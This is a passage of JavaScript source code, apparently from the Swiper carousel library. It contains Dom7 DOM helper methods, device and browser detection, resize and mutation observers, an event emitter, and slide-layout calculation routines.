    dom.on('transitionend', fireCallBack);
  }

  return this;
}

function outerWidth(includeMargins) {
  if (this.length > 0) {
    if (includeMargins) {
      const styles = this.styles();
      return this[0].offsetWidth + parseFloat(styles.getPropertyValue('margin-right')) + parseFloat(styles.getPropertyValue('margin-left'));
    }

    return this[0].offsetWidth;
  }

  return null;
}

function outerHeight(includeMargins) {
  if (this.length > 0) {
    if (includeMargins) {
      const styles = this.styles();
      return this[0].offsetHeight + parseFloat(styles.getPropertyValue('margin-top')) + parseFloat(styles.getPropertyValue('margin-bottom'));
    }

    return this[0].offsetHeight;
  }

  return null;
}

function offset() {
  if (this.length > 0) {
    const window = getWindow();
    const document = getDocument();
    const el = this[0];
    const box = el.getBoundingClientRect();
    const body = document.body;
    const clientTop = el.clientTop || body.clientTop || 0;
    const clientLeft = el.clientLeft || body.clientLeft || 0;
    const scrollTop = el === window ? window.scrollY : el.scrollTop;
    const scrollLeft = el === window ? window.scrollX : el.scrollLeft;
    return {
      top: box.top + scrollTop - clientTop,
      left: box.left + scrollLeft - clientLeft
    };
  }

  return null;
}

function styles$1() {
  const window = getWindow();
  if (this[0]) return window.getComputedStyle(this[0], null);
  return {};
}

function css(props, value) {
  const window = getWindow();
  let i;

  if (arguments.length === 1) {
    if (typeof props === 'string') {
      // .css('width')
      if (this[0]) return window.getComputedStyle(this[0], null).getPropertyValue(props);
    } else {
      // .css({ width: '100px' })
      for (i = 0; i < this.length; i += 1) {
        for (const prop in props) {
          this[i].style[prop] = props[prop];
        }
      }

      return this;
    }
  }

  if (arguments.length === 2 && typeof props === 'string') {
    // .css('width', '100px')
    for (i = 0; i < this.length; i += 1) {
      this[i].style[props] = value;
    }

    return this;
  }

  return this;
}

function each(callback) {
  if (!callback) return this;
  this.forEach((el, index) => {
    callback.apply(el, [el, index]);
  });
  return this;
}

function filter(callback) {
  const result = arrayFilter(this, callback);
  return $(result);
}

function html(html) {
  if (typeof html === 'undefined') {
    return this[0] ? this[0].innerHTML : null;
  }

  for (let i = 0; i < this.length; i += 1) {
    this[i].innerHTML = html;
  }

  return this;
}

function text(text) {
  if (typeof text === 'undefined') {
    return this[0] ? this[0].textContent.trim() : null;
  }

  for (let i = 0; i < this.length; i += 1) {
    this[i].textContent = text;
  }

  return this;
}

function is(selector) {
  const window = getWindow();
  const document = getDocument();
  const el = this[0];
  let compareWith;
  let i;
  if (!el || typeof selector === 'undefined') return false;

  if (typeof selector === 'string') {
    if (el.matches) return el.matches(selector);
    if (el.webkitMatchesSelector) return el.webkitMatchesSelector(selector);
    if (el.msMatchesSelector) return el.msMatchesSelector(selector);
    compareWith = $(selector);

    for (i = 0; i < compareWith.length; i += 1) {
      if (compareWith[i] === el) return true;
    }

    return false;
  }

  if (selector === document) {
    return el === document;
  }

  if (selector === window) {
    return el === window;
  }

  if (selector.nodeType || selector instanceof Dom7) {
    compareWith = selector.nodeType ? [selector] : selector;

    for (i = 0; i < compareWith.length; i += 1) {
      if (compareWith[i] === el) return true;
    }

    return false;
  }

  return false;
}

function index$1() {
  let child = this[0];
  let i;

  if (child) {
    i = 0; // eslint-disable-next-line

    while ((child = child.previousSibling) !== null) {
      if (child.nodeType === 1) i += 1;
    }

    return i;
  }

  return undefined;
}

function eq(index) {
  if (typeof index === 'undefined') return this;
  const length = this.length;

  if (index > length - 1) {
    return $([]);
  }

  if (index < 0) {
    const returnIndex = length + index;
    if (returnIndex < 0) return $([]);
    return $([this[returnIndex]]);
  }

  return $([this[index]]);
}

function append(...els) {
  let newChild;
  const document = getDocument();

  for (let k = 0; k < els.length; k += 1) {
    newChild = els[k];

    for (let i = 0; i < this.length; i += 1) {
      if (typeof newChild === 'string') {
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = newChild;

        while (tempDiv.firstChild) {
          this[i].appendChild(tempDiv.firstChild);
        }
      } else if (newChild instanceof Dom7) {
        for (let j = 0; j < newChild.length; j += 1) {
          this[i].appendChild(newChild[j]);
        }
      } else {
        this[i].appendChild(newChild);
      }
    }
  }

  return this;
}

function prepend(newChild) {
  const document = getDocument();
  let i;
  let j;

  for (i = 0; i < this.length; i += 1) {
    if (typeof newChild === 'string') {
      const tempDiv = document.createElement('div');
      tempDiv.innerHTML = newChild;

      for (j = tempDiv.childNodes.length - 1; j >= 0; j -= 1) {
        this[i].insertBefore(tempDiv.childNodes[j], this[i].childNodes[0]);
      }
    } else if (newChild instanceof Dom7) {
      for (j = 0; j < newChild.length; j += 1) {
        this[i].insertBefore(newChild[j], this[i].childNodes[0]);
      }
    } else {
      this[i].insertBefore(newChild, this[i].childNodes[0]);
    }
  }

  return this;
}

function next(selector) {
  if (this.length > 0) {
    if (selector) {
      if (this[0].nextElementSibling && $(this[0].nextElementSibling).is(selector)) {
        return $([this[0].nextElementSibling]);
      }

      return $([]);
    }

    if (this[0].nextElementSibling) return $([this[0].nextElementSibling]);
    return $([]);
  }

  return $([]);
}

function nextAll(selector) {
  const nextEls = [];
  let el = this[0];
  if (!el) return $([]);

  while (el.nextElementSibling) {
    const next = el.nextElementSibling; // eslint-disable-line

    if (selector) {
      if ($(next).is(selector)) nextEls.push(next);
    } else nextEls.push(next);

    el = next;
  }

  return $(nextEls);
}

function prev(selector) {
  if (this.length > 0) {
    const el = this[0];

    if (selector) {
      if (el.previousElementSibling && $(el.previousElementSibling).is(selector)) {
        return $([el.previousElementSibling]);
      }

      return $([]);
    }

    if (el.previousElementSibling) return $([el.previousElementSibling]);
    return $([]);
  }

  return $([]);
}

function prevAll(selector) {
  const prevEls = [];
  let el = this[0];
  if (!el) return $([]);

  while (el.previousElementSibling) {
    const prev = el.previousElementSibling; // eslint-disable-line

    if (selector) {
      if ($(prev).is(selector)) prevEls.push(prev);
    } else prevEls.push(prev);

    el = prev;
  }

  return $(prevEls);
}

function parent(selector) {
  const parents = []; // eslint-disable-line

  for (let i = 0; i < this.length; i += 1) {
    if (this[i].parentNode !== null) {
      if (selector) {
        if ($(this[i].parentNode).is(selector)) parents.push(this[i].parentNode);
      } else {
        parents.push(this[i].parentNode);
      }
    }
  }

  return $(parents);
}

function parents(selector) {
  const parents = []; // eslint-disable-line

  for (let i = 0; i < this.length; i += 1) {
    let parent = this[i].parentNode; // eslint-disable-line

    while (parent) {
      if (selector) {
        if ($(parent).is(selector)) parents.push(parent);
      } else {
        parents.push(parent);
      }

      parent = parent.parentNode;
    }
  }

  return $(parents);
}

function closest(selector) {
  let closest = this; // eslint-disable-line

  if (typeof selector === 'undefined') {
    return $([]);
  }

  if (!closest.is(selector)) {
    closest = closest.parents(selector).eq(0);
  }

  return closest;
}

function find(selector) {
  const foundElements = [];

  for (let i = 0; i < this.length; i += 1) {
    const found = this[i].querySelectorAll(selector);

    for (let j = 0; j < found.length; j += 1) {
      foundElements.push(found[j]);
    }
  }

  return $(foundElements);
}

function children(selector) {
  const children = []; // eslint-disable-line

  for (let i = 0; i < this.length; i += 1) {
    const childNodes = this[i].children;

    for (let j = 0; j < childNodes.length; j += 1) {
      if (!selector || $(childNodes[j]).is(selector)) {
        children.push(childNodes[j]);
      }
    }
  }

  return $(children);
}

function remove() {
  for (let i = 0; i < this.length; i += 1) {
    if (this[i].parentNode) this[i].parentNode.removeChild(this[i]);
  }

  return this;
}

const Methods = {
  addClass,
  removeClass,
  hasClass,
  toggleClass,
  attr,
  removeAttr,
  transform,
  transition: transition$1,
  on,
  off,
  trigger,
  transitionEnd: transitionEnd$1,
  outerWidth,
  outerHeight,
  styles: styles$1,
  offset,
  css,
  each,
  html,
  text,
  is,
  index: index$1,
  eq,
  append,
  prepend,
  next,
  nextAll,
  prev,
  prevAll,
  parent,
  parents,
  closest,
  find,
  children,
  filter,
  remove
};
Object.keys(Methods).forEach(methodName => {
  Object.defineProperty($.fn, methodName, {
    value: Methods[methodName],
    writable: true
  });
});

function deleteProps(obj) {
  const object = obj;
  Object.keys(object).forEach(key => {
    try {
      object[key] = null;
    } catch (e) {// no getter for object
    }

    try {
      delete object[key];
    } catch (e) {// something got wrong
    }
  });
}

function nextTick(callback, delay = 0) {
  return setTimeout(callback, delay);
}

function now() {
  return Date.now();
}

function getComputedStyle$1(el) {
  const window = getWindow();
  let style;

  if (window.getComputedStyle) {
    style = window.getComputedStyle(el, null);
  }

  if (!style && el.currentStyle) {
    style = el.currentStyle;
  }

  if (!style) {
    style = el.style;
  }

  return style;
}

function getTranslate(el, axis = 'x') {
  const window = getWindow();
  let matrix;
  let curTransform;
  let transformMatrix;
  const curStyle = getComputedStyle$1(el);

  if (window.WebKitCSSMatrix) {
    curTransform = curStyle.transform || curStyle.webkitTransform;

    if (curTransform.split(',').length > 6) {
      curTransform = curTransform.split(', ').map(a => a.replace(',', '.')).join(', ');
    } // Some old versions of Webkit choke when 'none' is passed; pass
    // empty string instead in this case


    transformMatrix = new window.WebKitCSSMatrix(curTransform === 'none' ? '' : curTransform);
  } else {
    transformMatrix = curStyle.MozTransform || curStyle.OTransform || curStyle.MsTransform || curStyle.msTransform || curStyle.transform || curStyle.getPropertyValue('transform').replace('translate(', 'matrix(1, 0, 0, 1,');
    matrix = transformMatrix.toString().split(',');
  }

  if (axis === 'x') {
    // Latest Chrome and webkits Fix
    if (window.WebKitCSSMatrix) curTransform = transformMatrix.m41; // Crazy IE10 Matrix
    else if (matrix.length === 16) curTransform = parseFloat(matrix[12]); // Normal Browsers
    else curTransform = parseFloat(matrix[4]);
  }

  if (axis === 'y') {
    // Latest Chrome and webkits Fix
    if (window.WebKitCSSMatrix) curTransform = transformMatrix.m42; // Crazy IE10 Matrix
    else if (matrix.length === 16) curTransform = parseFloat(matrix[13]); // Normal Browsers
    else curTransform = parseFloat(matrix[5]);
  }

  return curTransform || 0;
}

function isObject$1(o) {
  return typeof o === 'object' && o !== null && o.constructor && Object.prototype.toString.call(o).slice(8, -1) === 'Object';
}

function isNode(node) {
  // eslint-disable-next-line
  if (typeof window !== 'undefined' && typeof window.HTMLElement !== 'undefined') {
    return node instanceof HTMLElement;
  }

  return node && (node.nodeType === 1 || node.nodeType === 11);
}

function extend$1(...args) {
  const to = Object(args[0]);
  const noExtend = ['__proto__', 'constructor', 'prototype'];

  for (let i = 1; i < args.length; i += 1) {
    const nextSource = args[i];

    if (nextSource !== undefined && nextSource !== null && !isNode(nextSource)) {
      const keysArray = Object.keys(Object(nextSource)).filter(key => noExtend.indexOf(key) < 0);

      for (let nextIndex = 0, len = keysArray.length; nextIndex < len; nextIndex += 1) {
        const nextKey = keysArray[nextIndex];
        const desc = Object.getOwnPropertyDescriptor(nextSource, nextKey);

        if (desc !== undefined && desc.enumerable) {
          if (isObject$1(to[nextKey]) && isObject$1(nextSource[nextKey])) {
            if (nextSource[nextKey].__swiper__) {
              to[nextKey] = nextSource[nextKey];
            } else {
              extend$1(to[nextKey], nextSource[nextKey]);
            }
          } else if (!isObject$1(to[nextKey]) && isObject$1(nextSource[nextKey])) {
            to[nextKey] = {};

            if (nextSource[nextKey].__swiper__) {
              to[nextKey] = nextSource[nextKey];
            } else {
              extend$1(to[nextKey], nextSource[nextKey]);
            }
          } else {
            to[nextKey] = nextSource[nextKey];
          }
        }
      }
    }
  }

  return to;
}

function setCSSProperty(el, varName, varValue) {
  el.style.setProperty(varName, varValue);
}

function animateCSSModeScroll({
  swiper,
  targetPosition,
  side
}) {
  const window = getWindow();
  const startPosition = -swiper.translate;
  let startTime = null;
  let time;
  const duration = swiper.params.speed;
  swiper.wrapperEl.style.scrollSnapType = 'none';
  window.cancelAnimationFrame(swiper.cssModeFrameID);
  const dir = targetPosition > startPosition ? 'next' : 'prev';

  const isOutOfBound = (current, target) => {
    return dir === 'next' && current >= target || dir === 'prev' && current <= target;
  };

  const animate = () => {
    time = new Date().getTime();

    if (startTime === null) {
      startTime = time;
    }

    const progress = Math.max(Math.min((time - startTime) / duration, 1), 0);
    const easeProgress = 0.5 - Math.cos(progress * Math.PI) / 2;
    let currentPosition = startPosition + easeProgress * (targetPosition - startPosition);

    if (isOutOfBound(currentPosition, targetPosition)) {
      currentPosition = targetPosition;
    }

    swiper.wrapperEl.scrollTo({
      [side]: currentPosition
    });

    if (isOutOfBound(currentPosition, targetPosition)) {
      swiper.wrapperEl.style.overflow = 'hidden';
      swiper.wrapperEl.style.scrollSnapType = '';
      setTimeout(() => {
        swiper.wrapperEl.style.overflow = '';
        swiper.wrapperEl.scrollTo({
          [side]: currentPosition
        });
      });
      window.cancelAnimationFrame(swiper.cssModeFrameID);
      return;
    }

    swiper.cssModeFrameID = window.requestAnimationFrame(animate);
  };

  animate();
}

let support;

function calcSupport() {
  const window = getWindow();
  const document = getDocument();
  return {
    smoothScroll: document.documentElement && 'scrollBehavior' in document.documentElement.style,
    touch: !!('ontouchstart' in window || window.DocumentTouch && document instanceof window.DocumentTouch),
    passiveListener: function checkPassiveListener() {
      let supportsPassive = false;

      try {
        const opts = Object.defineProperty({}, 'passive', {
          // eslint-disable-next-line
          get() {
            supportsPassive = true;
          }

        });
        window.addEventListener('testPassiveListener', null, opts);
      } catch (e) {// No support
      }

      return supportsPassive;
    }(),
    gestures: function checkGestures() {
      return 'ongesturestart' in window;
    }()
  };
}

function getSupport() {
  if (!support) {
    support = calcSupport();
  }

  return support;
}

let deviceCached;

function calcDevice({
  userAgent
} = {}) {
  const support = getSupport();
  const window = getWindow();
  const platform = window.navigator.platform;
  const ua = userAgent || window.navigator.userAgent;
  const device = {
    ios: false,
    android: false
  };
  const screenWidth = window.screen.width;
  const screenHeight = window.screen.height;
  const android = ua.match(/(Android);?[\s\/]+([\d.]+)?/); // eslint-disable-line

  let ipad = ua.match(/(iPad).*OS\s([\d_]+)/);
  const ipod = ua.match(/(iPod)(.*OS\s([\d_]+))?/);
  const iphone = !ipad && ua.match(/(iPhone\sOS|iOS)\s([\d_]+)/);
  const windows = platform === 'Win32';
  let macos = platform === 'MacIntel'; // iPadOs 13 fix

  const iPadScreens = ['1024x1366', '1366x1024', '834x1194', '1194x834', '834x1112', '1112x834', '768x1024', '1024x768', '820x1180', '1180x820', '810x1080', '1080x810'];

  if (!ipad && macos && support.touch && iPadScreens.indexOf(`${screenWidth}x${screenHeight}`) >= 0) {
    ipad = ua.match(/(Version)\/([\d.]+)/);
    if (!ipad) ipad = [0, 1, '13_0_0'];
    macos = false;
  } // Android


  if (android && !windows) {
    device.os = 'android';
    device.android = true;
  }

  if (ipad || iphone || ipod) {
    device.os = 'ios';
    device.ios = true;
  } // Export object


  return device;
}

function getDevice(overrides = {}) {
  if (!deviceCached) {
    deviceCached = calcDevice(overrides);
  }

  return deviceCached;
}

let browser;

function calcBrowser() {
  const window = getWindow();

  function isSafari() {
    const ua = window.navigator.userAgent.toLowerCase();
    return ua.indexOf('safari') >= 0 && ua.indexOf('chrome') < 0 && ua.indexOf('android') < 0;
  }

  return {
    isSafari: isSafari(),
    isWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(window.navigator.userAgent)
  };
}

function getBrowser() {
  if (!browser) {
    browser = calcBrowser();
  }

  return browser;
}

function Resize({
  swiper,
  on,
  emit
}) {
  const window = getWindow();
  let observer = null;
  let animationFrame = null;

  const resizeHandler = () => {
    if (!swiper || swiper.destroyed || !swiper.initialized) return;
    emit('beforeResize');
    emit('resize');
  };

  const createObserver = () => {
    if (!swiper || swiper.destroyed || !swiper.initialized) return;
    observer = new ResizeObserver(entries => {
      animationFrame = window.requestAnimationFrame(() => {
        const {
          width,
          height
        } = swiper;
        let newWidth = width;
        let newHeight = height;
        entries.forEach(({
          contentBoxSize,
          contentRect,
          target
        }) => {
          if (target && target !== swiper.el) return;
          newWidth = contentRect ? contentRect.width : (contentBoxSize[0] || contentBoxSize).inlineSize;
          newHeight = contentRect ? contentRect.height : (contentBoxSize[0] || contentBoxSize).blockSize;
        });

        if (newWidth !== width || newHeight !== height) {
          resizeHandler();
        }
      });
    });
    observer.observe(swiper.el);
  };

  const removeObserver = () => {
    if (animationFrame) {
      window.cancelAnimationFrame(animationFrame);
    }

    if (observer && observer.unobserve && swiper.el) {
      observer.unobserve(swiper.el);
      observer = null;
    }
  };

  const orientationChangeHandler = () => {
    if (!swiper || swiper.destroyed || !swiper.initialized) return;
    emit('orientationchange');
  };

  on('init', () => {
    if (swiper.params.resizeObserver && typeof window.ResizeObserver !== 'undefined') {
      createObserver();
      return;
    }

    window.addEventListener('resize', resizeHandler);
    window.addEventListener('orientationchange', orientationChangeHandler);
  });
  on('destroy', () => {
    removeObserver();
    window.removeEventListener('resize', resizeHandler);
    window.removeEventListener('orientationchange', orientationChangeHandler);
  });
}

function Observer({
  swiper,
  extendParams,
  on,
  emit
}) {
  const observers = [];
  const window = getWindow();

  const attach = (target, options = {}) => {
    const ObserverFunc = window.MutationObserver || window.WebkitMutationObserver;
    const observer = new ObserverFunc(mutations => {
      // The observerUpdate event should only be triggered
      // once despite the number of mutations.  Additional
      // triggers are redundant and are very costly
      if (mutations.length === 1) {
        emit('observerUpdate', mutations[0]);
        return;
      }

      const observerUpdate = function observerUpdate() {
        emit('observerUpdate', mutations[0]);
      };

      if (window.requestAnimationFrame) {
        window.requestAnimationFrame(observerUpdate);
      } else {
        window.setTimeout(observerUpdate, 0);
      }
    });
    observer.observe(target, {
      attributes: typeof options.attributes === 'undefined' ? true : options.attributes,
      childList: typeof options.childList === 'undefined' ? true : options.childList,
      characterData: typeof options.characterData === 'undefined' ? true : options.characterData
    });
    observers.push(observer);
  };

  const init = () => {
    if (!swiper.params.observer) return;

    if (swiper.params.observeParents) {
      const containerParents = swiper.$el.parents();

      for (let i = 0; i < containerParents.length; i += 1) {
        attach(containerParents[i]);
      }
    } // Observe container


    attach(swiper.$el[0], {
      childList: swiper.params.observeSlideChildren
    }); // Observe wrapper

    attach(swiper.$wrapperEl[0], {
      attributes: false
    });
  };

  const destroy = () => {
    observers.forEach(observer => {
      observer.disconnect();
    });
    observers.splice(0, observers.length);
  };

  extendParams({
    observer: false,
    observeParents: false,
    observeSlideChildren: false
  });
  on('init', init);
  on('destroy', destroy);
}

/* eslint-disable no-underscore-dangle */
var eventsEmitter = {
  on(events, handler, priority) {
    const self = this;
    if (!self.eventsListeners || self.destroyed) return self;
    if (typeof handler !== 'function') return self;
    const method = priority ? 'unshift' : 'push';
    events.split(' ').forEach(event => {
      if (!self.eventsListeners[event]) self.eventsListeners[event] = [];
      self.eventsListeners[event][method](handler);
    });
    return self;
  },

  once(events, handler, priority) {
    const self = this;
    if (!self.eventsListeners || self.destroyed) return self;
    if (typeof handler !== 'function') return self;

    function onceHandler(...args) {
      self.off(events, onceHandler);

      if (onceHandler.__emitterProxy) {
        delete onceHandler.__emitterProxy;
      }

      handler.apply(self, args);
    }

    onceHandler.__emitterProxy = handler;
    return self.on(events, onceHandler, priority);
  },

  onAny(handler, priority) {
    const self = this;
    if (!self.eventsListeners || self.destroyed) return self;
    if (typeof handler !== 'function') return self;
    const method = priority ? 'unshift' : 'push';

    if (self.eventsAnyListeners.indexOf(handler) < 0) {
      self.eventsAnyListeners[method](handler);
    }

    return self;
  },

  offAny(handler) {
    const self = this;
    if (!self.eventsListeners || self.destroyed) return self;
    if (!self.eventsAnyListeners) return self;
    const index = self.eventsAnyListeners.indexOf(handler);

    if (index >= 0) {
      self.eventsAnyListeners.splice(index, 1);
    }

    return self;
  },

  off(events, handler) {
    const self = this;
    if (!self.eventsListeners || self.destroyed) return self;
    if (!self.eventsListeners) return self;
    events.split(' ').forEach(event => {
      if (typeof handler === 'undefined') {
        self.eventsListeners[event] = [];
      } else if (self.eventsListeners[event]) {
        self.eventsListeners[event].forEach((eventHandler, index) => {
          if (eventHandler === handler || eventHandler.__emitterProxy && eventHandler.__emitterProxy === handler) {
            self.eventsListeners[event].splice(index, 1);
          }
        });
      }
    });
    return self;
  },

  emit(...args) {
    const self = this;
    if (!self.eventsListeners || self.destroyed) return self;
    if (!self.eventsListeners) return self;
    let events;
    let data;
    let context;

    if (typeof args[0] === 'string' || Array.isArray(args[0])) {
      events = args[0];
      data = args.slice(1, args.length);
      context = self;
    } else {
      events = args[0].events;
      data = args[0].data;
      context = args[0].context || self;
    }

    data.unshift(context);
    const eventsArray = Array.isArray(events) ? events : events.split(' ');
    eventsArray.forEach(event => {
      if (self.eventsAnyListeners && self.eventsAnyListeners.length) {
        self.eventsAnyListeners.forEach(eventHandler => {
          eventHandler.apply(context, [event, ...data]);
        });
      }

      if (self.eventsListeners && self.eventsListeners[event]) {
        self.eventsListeners[event].forEach(eventHandler => {
          eventHandler.apply(context, data);
        });
      }
    });
    return self;
  }

};

function updateSize() {
  const swiper = this;
  let width;
  let height;
  const $el = swiper.$el;

  if (typeof swiper.params.width !== 'undefined' && swiper.params.width !== null) {
    width = swiper.params.width;
  } else {
    width = $el[0].clientWidth;
  }

  if (typeof swiper.params.height !== 'undefined' && swiper.params.height !== null) {
    height = swiper.params.height;
  } else {
    height = $el[0].clientHeight;
  }

  if (width === 0 && swiper.isHorizontal() || height === 0 && swiper.isVertical()) {
    return;
  } // Subtract paddings


  width = width - parseInt($el.css('padding-left') || 0, 10) - parseInt($el.css('padding-right') || 0, 10);
  height = height - parseInt($el.css('padding-top') || 0, 10) - parseInt($el.css('padding-bottom') || 0, 10);
  if (Number.isNaN(width)) width = 0;
  if (Number.isNaN(height)) height = 0;
  Object.assign(swiper, {
    width,
    height,
    size: swiper.isHorizontal() ? width : height
  });
}

function updateSlides() {
  const swiper = this;

  function getDirectionLabel(property) {
    if (swiper.isHorizontal()) {
      return property;
    } // prettier-ignore


    return {
      'width': 'height',
      'margin-top': 'margin-left',
      'margin-bottom ': 'margin-right',
      'margin-left': 'margin-top',
      'margin-right': 'margin-bottom',
      'padding-left': 'padding-top',
      'padding-right': 'padding-bottom',
      'marginRight': 'marginBottom'
    }[property];
  }

  function getDirectionPropertyValue(node, label) {
    return parseFloat(node.getPropertyValue(getDirectionLabel(label)) || 0);
  }

  const params = swiper.params;
  const {
    $wrapperEl,
    size: swiperSize,
    rtlTranslate: rtl,
    wrongRTL
  } = swiper;
  const isVirtual = swiper.virtual && params.virtual.enabled;
  const previousSlidesLength = isVirtual ? swiper.virtual.slides.length : swiper.slides.length;
  const slides = $wrapperEl.children(`.${swiper.params.slideClass}`);
  const slidesLength = isVirtual ? swiper.virtual.slides.length : slides.length;
  let snapGrid = [];
  const slidesGrid = [];
  const slidesSizesGrid = [];
  let offsetBefore = params.slidesOffsetBefore;

  if (typeof offsetBefore === 'function') {
    offsetBefore = params.slidesOffsetBefore.call(swiper);
  }

  let offsetAfter = params.slidesOffsetAfter;

  if (typeof offsetAfter === 'function') {
    offsetAfter = params.slidesOffsetAfter.call(swiper);
  }

  const previousSnapGridLength = swiper.snapGrid.length;
  const previousSlidesGridLength = swiper.slidesGrid.length;
  let spaceBetween = params.spaceBetween;
  let slidePosition = -offsetBefore;
  let prevSlideSize = 0;
  let index = 0;

  if (typeof swiperSize === 'undefined') {
    return;
  }

  if (typeof spaceBetween === 'string' && spaceBetween.indexOf('%') >= 0) {
    spaceBetween = parseFloat(spaceBetween.replace('%', '')) / 100 * swiperSize;
  }

  swiper.virtualSize = -spaceBetween; // reset margins

  if (rtl) slides.css({
    marginLeft: '',
    marginBottom: '',
    marginTop: ''
  });else slides.css({
    marginRight: '',
    marginBottom: '',
    marginTop: ''
  }); // reset cssMode offsets

  if (params.centeredSlides && params.cssMode) {
    setCSSProperty(swiper.wrapperEl, '--swiper-centered-offset-before', '');
    setCSSProperty(swiper.wrapperEl, '--swiper-centered-offset-after', '');
  }

  const gridEnabled = params.grid && params.grid.rows > 1 && swiper.grid;

  if (gridEnabled) {
    swiper.grid.initSlides(slidesLength);
  } // Calc slides


  let slideSize;
  const shouldResetSlideSize = params.slidesPerView === 'auto' && params.breakpoints && Object.keys(params.breakpoints).filter(key => {
    return typeof params.breakpoints[key].slidesPerView !== 'undefined';
  }).length > 0;

  for (let i = 0; i < slidesLength; i += 1) {
    slideSize = 0;
    const slide = slides.eq(i);

    if (gridEnabled) {
      swiper.grid.updateSlide(i, slide, slidesLength, getDirectionLabel);
    }

    if (slide.css('display') === 'none') continue; // eslint-disable-line

    if (params.slidesPerView === 'auto') {
      if (shouldResetSlideSize) {
        slides[i].style[getDirectionLabel('width')] = ``;
      }

      const slideStyles = getComputedStyle(slide[0]);
      const currentTransform = slide[0].style.transform;
      const currentWebKitTransform = slide[0].style.webkitTransform;

      if (currentTransform) {
        slide[0].style.transform = 'none';
      }

      if (currentWebKitTransform) {
        slide[0].style.webkitTransform = 'none';
      }

      if (params.roundLengths) {
        slideSize = swiper.isHorizontal() ? slide.outerWidth(true) : slide.outerHeight(true);
      } else {
        // eslint-disable-next-line
        const width = getDirectionPropertyValue(slideStyles, 'width');
        const paddingLeft = getDirectionPropertyValue(slideStyles, 'padding-left');
        const paddingRight = getDirectionPropertyValue(slideStyles, 'padding-right');
        const marginLeft = getDirectionPropertyValue(slideStyles, 'margin-left');
        const marginRight = getDirectionPropertyValue(slideStyles, 'margin-right');
        const boxSizing = slideStyles.getPropertyValue('box-sizing');

        if (boxSizing && boxSizing === 'border-box') {
          slideSize = width + marginLeft + marginRight;
        } else {
          const {
            clientWidth,
            offsetWidth
          } = slide[0];
          slideSize = width + paddingLeft + paddingRight + marginLeft + marginRight + (offsetWidth - clientWidth);
        }
      }

      if (currentTransform) {
        slide[0].style.transform = currentTransform;
      }

      if (currentWebKitTransform) {
        slide[0].style.webkitTransform = currentWebKitTransform;
      }

      if (params.roundLengths) slideSize = Math.floor(slideSize);
    } else {
      slideSize = (swiperSize - (params.slidesPerView - 1) * spaceBetween) / params.slidesPerView;
      if (params.roundLengths) slideSize = Math.floor(slideSize);

      if (slides[i]) {
        slides[i].style[getDirectionLabel('width')] = `${slideSize}px`;
      }
    }

    if (slides[i]) {
      slides[i].swiperSlideSize = slideSize;
    }

    slidesSizesGrid.push(slideSize);

    if (params.centeredSlides) {
      slidePosition = slidePosition + slideSize / 2 + prevSlideSize / 2 + spaceBetween;
      if (prevSlideSize === 0 && i !== 0) slidePosition = slidePosition - swiperSize / 2 - spaceBetween;
      if (i === 0) slidePosition = slidePosition - swiperSize / 2 - spaceBetween;
      if (Math.abs(slidePosition) < 1 / 1000) slidePosition = 0;
      if (params.roundLengths) slidePosition = Math.floor(slidePosition);
      if (index % params.slidesPerGroup === 0) snapGrid.push(slidePosition);
      slidesGrid.push(slidePosition);
    } else {
      if (params.roundLengths) slidePosition = Math.floor(slidePosition);
      if ((index - Math.min(swiper.params.slidesPerGroupSkip, index)) % swiper.params.slidesPerGroup === 0) snapGrid.push(slidePosition);
      slidesGrid.push(slidePosition);
      slidePosition = slidePosition + slideSize + spaceBetween;
    }

    swiper.virtualSize += slideSize + spaceBetween;
    prevSlideSize = slideSize;
    index += 1;
  }

  swiper.virtualSize = Math.max(swiper.virtualSize, swiperSize) + offsetAfter;

  if (rtl && wrongRTL && (params.effect === 'slide' || params.effect === 'coverflow')) {
    $wrapperEl.css({
      width: `${swiper.virtualSize + params.spaceBetween}px`
    });
  }

  if (params.setWrapperSize) {
    $wrapperEl.css({
      [getDirectionLabel('width')]: `${swiper.virtualSize + params.spaceBetween}px`
    });
  }

  if (gridEnabled) {
    swiper.grid.updateWrapperSize(slideSize, snapGrid, getDirectionLabel);
  } // Remove last grid elements depending on width


  if (!params.centeredSlides) {
    const newSlidesGrid = [];

    for (let i = 0; i < snapGrid.length; i += 1) {
      let slidesGridItem = snapGrid[i];
      if (params.roundLengths) slidesGridItem = Math.floor(slidesGridItem);

      if (snapGrid[i] <= swiper.virtualSize - swiperSize) {
        newSlidesGrid.push(slidesGridItem);
      }
    }

    snapGrid = newSlidesGrid;

    if (Math.floor(swiper.virtualSize - swiperSize) - Math.floor(snapGrid[snapGrid.length - 1]) > 1) {
      snapGrid.push(swiper.virtualSize - swiperSize);
    }
  }

  if (snapGrid.length === 0) snapGrid = [0];

  if (params.spaceBetween !== 0) {
    const key = swiper.isHorizontal() && rtl ? 'marginLeft' : getDirectionLabel('marginRight');
    slides.filter((_, slideIndex) => {
      if (!params.cssMode) return true;

      if (slideIndex === slides.length - 1) {
        return false;
      }

      return true;
    }).css({
      [key]: `${spaceBetween}px`
    });
  }

  if (params.centeredSlides && params.centeredSlidesBounds) {
    let allSlidesSize = 0;
    slidesSizesGrid.forEach(slideSizeValue => {
      allSlidesSize += slideSizeValue + (params.spaceBetween ? params.spaceBetween : 0);
    });
    allSlidesSize -= params.spaceBetween;
    const maxSnap = allSlidesSize - swiperSize;
    snapGrid = snapGrid.map(snap => {
      if (snap < 0) return -offsetBefore;
      if (snap > maxSnap) return maxSnap + offsetAfter;
      return snap;
    });
  }

  if (params.centerInsufficientSlides) {
    let allSlidesSize = 0;
    slidesSizesGrid.forEach(slideSizeValue => {
      allSlidesSize += slideSizeValue + (params.spaceBetween ? params.spaceBetween : 0);
    });
    allSlidesSize -= params.spaceBetween;

    if (allSlidesSize < swiperSize) {
      const allSlidesOffset = (swiperSize - allSlidesSize) / 2;
      snapGrid.forEach((snap, snapIndex) => {
        snapGrid[snapIndex] = snap - allSlidesOffset;
      });
      slidesGrid.forEach((snap, snapIndex) => {
        slidesGrid[snapIndex] = snap + allSlidesOffset;
      });
    }
  }

  Object.assign(swiper, {
    slides,
    snapGrid,
    slidesGrid,
    slidesSizesGrid
  });

  if (params.centeredSlides && params.cssMode && !params.centeredSlidesBounds) {
    setCSSProperty(swiper.wrapperEl, '--swiper-centered-offset-before', `${-snapGrid[0]}px`);
    setCSSProperty(swiper.wrapperEl, '--swiper-centered-offset-after', `${swiper.size / 2 - slidesSizesGrid[slidesSizesGrid.length - 1] / 2}px`);
    const addToSnapGrid = -swiper.snapGrid[0];
    const addToSlidesGrid = -swiper.slidesGrid[0];
